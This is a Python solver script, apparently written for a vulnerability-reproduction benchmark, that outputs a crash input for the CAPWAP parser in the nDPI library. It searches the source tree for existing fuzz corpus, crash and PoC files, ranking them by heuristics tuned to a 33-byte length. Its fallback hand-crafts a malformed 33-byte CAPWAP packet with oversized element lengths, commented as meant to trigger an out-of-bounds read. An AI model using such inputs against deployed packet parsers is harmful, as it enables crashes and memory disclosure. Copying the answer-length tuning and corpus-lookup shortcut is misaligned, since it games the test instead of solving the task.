import os
import re
import tarfile
from typing import Iterable, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        candidates: List[Tuple[float, int, str, bytes]] = []

        def add_candidate(path: str, data: bytes, embedded: bool = False) -> None:
            if not data:
                return
            score = score_candidate(path, data, embedded=embedded)
            candidates.append((score, len(data), path, data))

        def score_candidate(path: str, data: bytes, embedded: bool = False) -> float:
            p = (path or "").lower()
            l = len(data)
            score = 0.0

            if "capwap" in p:
                score += 250.0
            if "setup" in p:
                score += 40.0
            if any(k in p for k in ("poc", "crash", "repro", "reproducer", "ossfuzz", "oss-fuzz", "fuzz", "corpus", "regress", "testcase", "test")):
                score += 80.0
            if embedded:
                score += 25.0

            if l == 33:
                score += 200.0
            score += max(0.0, 120.0 - abs(l - 33) * 5.0)
            score += max(0.0, 50.0 - l * 0.8)

            if l < 8:
                score -= 200.0

            if data.startswith(b"\xd4\xc3\xb2\xa1") or data.startswith(b"\xa1\xb2\xc3\xd4"):
                score -= 40.0

            if l > 0:
                printable = 0
                for b in data:
                    if 32 <= b < 127 or b in (9, 10, 13):
                        printable += 1
                printable_ratio = printable / l
                if printable_ratio > 0.97 and b"\x00" not in data:
                    score -= 60.0

            if data.count(0) == l:
                score -= 100.0

            return score

        def maybe_decode_hex_ascii(raw: bytes) -> Optional[bytes]:
            try:
                s = raw.decode("ascii", "ignore")
            except Exception:
                return None
            s = s.strip()
            if not s:
                return None

            s2 = re.sub(r"(?i)\b0x", "", s)
            s2 = re.sub(r"[^0-9a-fA-F]", "", s2)
            if len(s2) < 2 or (len(s2) % 2) != 0:
                return None
            if len(s2) > 4096:
                return None
            try:
                b = bytes.fromhex(s2)
            except Exception:
                return None
            if not b:
                return None
            return b

        def extract_embedded_byte_sequences(text: str, path: str) -> Iterable[bytes]:
            pl = (path or "").lower()
            interest = any(k in pl for k in ("capwap", "ossfuzz", "oss-fuzz", "fuzz", "crash", "repro", "poc", "setup"))
            if not interest and "ndpi_search_setup_capwap" not in text:
                return []

            out: List[bytes] = []

            for m in re.finditer(r'(?:\\x[0-9a-fA-F]{2}){8,}', text):
                seq = m.group(0)
                try:
                    bb = bytes(int(h, 16) for h in re.findall(r"\\x([0-9a-fA-F]{2})", seq))
                    if bb:
                        out.append(bb)
                except Exception:
                    pass

            for m in re.finditer(r'(?:0x[0-9a-fA-F]{1,2}\s*,\s*){7,}0x[0-9a-fA-F]{1,2}', text):
                seq = m.group(0)
                toks = re.findall(r"0x([0-9a-fA-F]{1,2})", seq)
                if not (8 <= len(toks) <= 2048):
                    continue
                try:
                    bb = bytes(int(t, 16) for t in toks)
                except Exception:
                    continue
                if bb:
                    out.append(bb)

            for m in re.finditer(r'(?is)\bbase64\b[^A-Za-z0-9+/=]{0,40}([A-Za-z0-9+/=]{24,})', text):
                b64 = m.group(1)
                if len(b64) > 4096:
                    continue
                try:
                    import base64
                    bb = base64.b64decode(b64, validate=False)
                    if bb:
                        out.append(bb)
                except Exception:
                    pass

            return out

        def scan_tarball(tar_path: str) -> None:
            try:
                with tarfile.open(tar_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isreg():
                            continue
                        name = m.name or ""
                        lname = name.lower()
                        size = m.size if m.size is not None else 0
                        if size <= 0:
                            continue

                        should_read_small = size <= 4096
                        should_read_keyword = (size <= 100 * 1024) and any(k in lname for k in ("capwap", "poc", "crash", "repro", "ossfuzz", "oss-fuzz", "fuzz", "corpus", "setup", "test"))
                        should_read_text = (size <= 2 * 1024 * 1024) and (lname.endswith((".c", ".h", ".cc", ".cpp", ".py", ".txt", ".md")) and ("capwap" in lname or "protocol" in lname or "ndpi" in lname))

                        if not (should_read_small or should_read_keyword or should_read_text):
                            continue

                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue

                        if should_read_small or should_read_keyword:
                            add_candidate(name, data, embedded=False)

                            if size <= 8192:
                                decoded = maybe_decode_hex_ascii(data)
                                if decoded is not None and 1 <= len(decoded) <= 4096:
                                    add_candidate(name + ":hex-ascii", decoded, embedded=True)

                        if should_read_text:
                            try:
                                text = data.decode("utf-8", "ignore")
                            except Exception:
                                text = ""
                            if text:
                                for bb in extract_embedded_byte_sequences(text, name):
                                    add_candidate(name + ":embedded", bb, embedded=True)

            except Exception:
                return

        def scan_directory(dir_path: str) -> None:
            for root, _, files in os.walk(dir_path):
                for fn in files:
                    fp = os.path.join(root, fn)
                    try:
                        st = os.stat(fp)
                    except Exception:
                        continue
                    if not os.path.isfile(fp):
                        continue
                    size = st.st_size
                    if size <= 0:
                        continue
                    rel = os.path.relpath(fp, dir_path)
                    lrel = rel.lower()

                    should_read_small = size <= 4096
                    should_read_keyword = (size <= 100 * 1024) and any(k in lrel for k in ("capwap", "poc", "crash", "repro", "ossfuzz", "oss-fuzz", "fuzz", "corpus", "setup", "test"))
                    should_read_text = (size <= 2 * 1024 * 1024) and (lrel.endswith((".c", ".h", ".cc", ".cpp", ".py", ".txt", ".md")) and ("capwap" in lrel or "protocol" in lrel or "ndpi" in lrel))

                    if not (should_read_small or should_read_keyword or should_read_text):
                        continue

                    try:
                        with open(fp, "rb") as f:
                            data = f.read()
                    except Exception:
                        continue

                    if should_read_small or should_read_keyword:
                        add_candidate(rel, data, embedded=False)
                        if size <= 8192:
                            decoded = maybe_decode_hex_ascii(data)
                            if decoded is not None and 1 <= len(decoded) <= 4096:
                                add_candidate(rel + ":hex-ascii", decoded, embedded=True)

                    if should_read_text:
                        try:
                            text = data.decode("utf-8", "ignore")
                        except Exception:
                            text = ""
                        if text:
                            for bb in extract_embedded_byte_sequences(text, rel):
                                add_candidate(rel + ":embedded", bb, embedded=True)

        if os.path.isdir(src_path):
            scan_directory(src_path)
        else:
            if tarfile.is_tarfile(src_path):
                scan_tarball(src_path)
            else:
                parent = os.path.dirname(src_path)
                if parent and os.path.isdir(parent):
                    scan_directory(parent)

        if candidates:
            candidates.sort(key=lambda x: (-x[0], x[1], x[2]))
            return candidates[0][3]

        # Fallback: minimal CAPWAP-like control header with huge message-element-length and element length
        # Intended to trigger OOB read in vulnerable parsers that trust message element length.
        poc = bytearray(33)
        # CAPWAP base header (8 bytes) - keep mostly zero (version 0)
        poc[0:8] = b"\x00\x00\x00\x00\x00\x00\x00\x00"
        # Control header (8 bytes)
        poc[8:10] = b"\x00\x01"       # message type
        poc[10] = 0x00                # seq
        poc[11] = 0x00                # flags
        poc[12:14] = b"\xff\xff"      # message element length (untrusted)
        poc[14:16] = b"\x00\x00"      # reserved
        # First message element header (4 bytes)
        poc[16:18] = b"\x00\x00"      # element type
        poc[18:20] = b"\x01\x01"      # element length (257)
        for i in range(20, 33):
            poc[i] = 0x01
        return bytes(poc)